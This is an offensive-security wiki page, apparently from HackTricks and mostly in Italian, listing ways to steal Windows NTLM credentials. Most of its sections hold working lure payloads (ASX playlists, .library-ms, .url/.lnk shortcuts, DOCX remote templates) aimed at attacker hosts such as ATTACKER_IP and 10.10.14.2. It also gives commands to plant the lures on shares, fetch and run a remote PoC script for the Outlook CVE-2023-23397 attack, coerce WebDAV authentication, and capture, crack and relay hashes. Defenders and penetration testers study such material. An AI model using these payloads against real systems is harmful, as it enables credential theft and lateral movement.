# Luoghi in cui rubare credenziali NTLM

{{#include ../../banners/hacktricks-training.md}}

**Controlla tutte le ottime idee disponibili su [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), dal download di un file Microsoft Word online fino alla source dei leak NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Share SMB scrivibile + lure UNC attivati da Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere in una share che gli utenti o i processi pianificati esplorano in Explorer**, deposita file i cui metadata puntano al tuo UNC (ad esempio `\\ATTACKER\share`). Il rendering della cartella attiva una **SMB authentication implicita** e invia un **NetNTLMv2** al tuo listener.<sup>[[1]](#references)</sup>

1. **Genera i lure** (copre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/ecc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Depositali nella share scrivibile** (qualsiasi cartella aperta dalla vittima):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Ascolta e cracka**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows può accedere a diversi file contemporaneamente; per qualsiasi elemento visualizzato in anteprima da Explorer (`BROWSE TO FOLDER`) non è necessario fare clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a fare in modo che un target apra o visualizzi in anteprima una playlist di Windows Media Player sotto il tuo controllo, puoi effettuare il leak di Net‑NTLMv2 indicando un percorso UNC come destinazione della voce. WMP tenterà di recuperare il contenuto multimediale referenziato tramite SMB ed eseguirà implicitamente l'autenticazione.<sup>[[3]](#references)[[4]](#references)</sup>

Payload di esempio:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flusso di raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo non sicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della libreria punta a un percorso UNC remoto (ad esempio, \\attacker\share), la semplice esplorazione/avvio del file .library-ms all'interno dello ZIP fa sì che Explorer enumeri l'UNC e invii l'autenticazione NTLM all'attacker. Questo produce un NetNTLMv2 che può essere sottoposto a cracking offline o potenzialmente inoltrato tramite relay.<sup>[[2]](#references)</sup>

File .library-ms minimale che punta a un UNC dell'attacker
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passaggi operativi
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.<sup>[[5]](#references)</sup>

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lato del listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Note
- Alla vittima è sufficiente avere Outlook for Windows in esecuzione quando si attiva il promemoria.
- Il leak restituisce Net‑NTLMv2, adatto al cracking offline o al relay (non al pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass di CVE‑2025‑24054)

Windows Explorer esegue automaticamente il rendering delle icone dei collegamenti. Ricerche recenti hanno dimostrato che, anche dopo la patch di Microsoft dell'aprile 2025 per i collegamenti con icone UNC, era ancora possibile attivare l'autenticazione NTLM senza clic ospitando il target del collegamento su un percorso UNC e mantenendo l'icona localmente (il bypass della patch è stato assegnato a CVE‑2025‑50154). La semplice visualizzazione della cartella fa sì che Explorer recuperi i metadati dal target remoto, inviando NTLM al server SMB dell'attaccante.<sup>[[6]](#references)</sup>

Payload Minimal Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programmare un payload di collegamento (.lnk) tramite PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Idee per la distribuzione
- Inserisci lo shortcut in uno ZIP e fai in modo che la vittima lo esplori.
- Posiziona lo shortcut in una share scrivibile che la vittima aprirà.
- Combinalo con altri file-esca nella stessa cartella, in modo che Explorer mostri l’anteprima degli elementi.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows carica i metadati `.lnk` durante la **visualizzazione/anteprima** (rendering dell’icona), non solo durante l’esecuzione. CVE‑2026‑25185 mostra un percorso di parsing in cui i blocchi **ExtraData** fanno sì che la shell risolva un percorso dell’icona e acceda al filesystem **durante il caricamento**, generando NTLM outbound quando il percorso è remoto.

Condizioni chiave per l’attivazione (osservate in `CShellLink::_LoadFromStream`):
- Includere **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate per la routine di aggiornamento dell’icona).
- Includere **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** valorizzato.
- Il loader espande le variabili d’ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` risolve in un percorso UNC (ad esempio `\\attacker\share\icon.ico`), la **semplice visualizzazione di una cartella** contenente lo shortcut causa l’autenticazione outbound. Lo stesso percorso di caricamento può essere attivato anche dall’**indicizzazione** e dalla **scansione AV**, rendendolo una pratica superficie di leak no-click.<sup>[[7]](#references)</sup>

Gli strumenti per la ricerca (parser/generator/UI) sono disponibili nel progetto **LnkMeMaybe** per creare/ispezionare queste strutture senza usare la GUI di Windows.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Il **client WebDAV** nativo può essere abusato per forzare la sessione di logon corrente ad autenticarsi verso un endpoint **HTTP/WebDAV** arbitrario:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Perché è utile:
- Contro un **server WebDAV controllato dall'attaccante**, può attivare **NTLM over HTTP** senza distribuire un client personalizzato.
- Contro **host interni**, è un modo discreto per **verificare dove vengono accettate le credenziali rubate** prima di procedere lateralmente.<sup>[[9]](#references)</sup>
- Il comando è una buona alternativa quando l'**SMB egress** è filtrato, ma **HTTP/WebDAV** è ancora raggiungibile.

Note operative:
- Il servizio **WebClient** deve essere in esecuzione sull'host di origine.
- `rundll32.exe` carica `davclnt.dll` e fa gestire a Windows l'autenticazione WebDAV usando le **credenziali dell'utente corrente**.<sup>[[10]](#references)</sup>
- Se lo indirizzi verso un'infrastruttura sotto il tuo controllo, usa un **listener/relay HTTP compatibile con NTLM**, come:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Dal punto di vista del rilevamento, l'esecuzione ripetuta di `rundll32.exe davclnt.dll,DavSetCookie` verso molti sistemi interni è un forte indicatore di **credential validation / preparazione a un movimento laterale simile a uno spray**, piuttosto che di un comportamento normale dell'utente.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) per coerce NTLM

I documenti Office possono fare riferimento a un template esterno. Se imposti il template allegato su un percorso UNC, l'apertura del documento eseguirà l'autenticazione verso SMB.

Modifiche minime alle relazioni DOCX (all'interno di word/):

1) Modifica word/settings.xml e aggiungi il riferimento al template allegato:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifica word/_rels/settings.xml.rels e fai puntare rId1337 al tuo UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ricompatta in .docx e consegna. Avvia il tuo SMB capture listener e attendi l'apertura.

Per idee post-capture sul relay o sull'abuso di NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Riferimenti
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
